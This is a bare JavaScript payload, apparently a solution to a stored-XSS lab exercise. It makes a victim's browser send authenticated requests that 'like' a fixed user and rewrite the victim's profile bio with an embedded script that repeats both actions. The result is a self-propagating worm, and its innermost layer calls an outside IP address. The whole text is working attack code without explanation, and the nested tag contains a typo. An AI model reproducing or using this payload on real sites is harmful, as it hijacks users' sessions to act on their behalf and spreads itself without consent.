
fetch("/a3/xss_stored/like/", {
  method: "POST",
  credentials: "include",
  body: new URLSearchParams({user_id:"58263966"})
});
fetch("/a3/xss_stored/edit/", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: new URLSearchParams({
    profile_id: "918203",
    bio: `<script>
            fetch("/a3/xss_stored/like/", {
              method: "POST",
              credentials: "include",
              body: new URLSearchParams({user_id:"58263966"})
            });
            fetch("/a3/xss_stored/edit/", {
              method: "POST",
              credentials: "include",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded"
              },
              body: new URLSearchParams({
                profile_id: "918203",
                bio: '<scrip> fetch("http://10.42.172.67/api/a3/xss_stored/like/58263966")</script>'
              });
            });
          </script>`
  })
});
